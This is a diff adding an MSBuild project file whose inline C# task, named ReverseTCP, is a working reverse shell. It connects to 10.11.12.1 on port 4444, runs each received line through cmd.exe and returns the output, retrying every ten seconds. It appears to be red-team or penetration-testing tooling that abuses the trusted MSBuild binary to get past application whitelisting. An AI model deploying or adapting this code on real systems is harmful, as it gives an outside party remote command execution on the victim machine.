@@ -1,0 +1,66 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="MSBuild">
+   <ReverseTCP />
+  </Target>
+  <UsingTask
+    TaskName="ReverseTCP"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <ParameterGroup/>
+    <Task>
+      <Reference Include="System.DirectoryServices" />
+      <Using Namespace="System" />
+      <Using Namespace="System.IO" />
+      <Using Namespace="System.Text" />
+      <Using Namespace="System.Threading" />
+      <Using Namespace="System.Diagnostics" />
+      <Using Namespace="System.Net.Sockets" />
+      <Code Type="Fragment" Language="cs">
+        <![CDATA[
+            string ip = "10.11.12.1";
+            int port = 4444; 
+            string shell = "cmd";
+            string option = " /c ";
+            while (true){
+                try{
+                    using (TcpClient client = new TcpClient(ip, port)){
+                        using (Stream stream = client.GetStream()){
+                            using (StreamReader rdr = new StreamReader(stream)){
+                                while (true){
+                                    string cmd = rdr.ReadLine();
+                                    if (string.IsNullOrEmpty(cmd))
+                                        break;
+                                    if (cmd == "exit")
+                                        return true;
+                                    try{
+                                        Process prc = new Process();
+                                        prc.StartInfo = new ProcessStartInfo();
+                                        prc.StartInfo.FileName = shell;
+                                        prc.StartInfo.Arguments = option + cmd.Trim();
+                                        prc.StartInfo.UseShellExecute = false;
+                                        prc.StartInfo.RedirectStandardOutput = true;
+                                        prc.StartInfo.RedirectStandardError = true;
+                                        prc.Start();
+                                        prc.StandardOutput.BaseStream.CopyTo(stream);
+                                        prc.StandardError.BaseStream.CopyTo(stream);
+                                        prc.WaitForExit();
+                                    }
+                                    catch {
+                                        string error = "Error running command " + cmd + "\n";
+                                        byte[] errorBytes = Encoding.ASCII.GetBytes(error);
+                                        stream.Write(errorBytes, 0, errorBytes.Length);
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                catch {
+                }
+                Thread.Sleep(10000);
+            }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
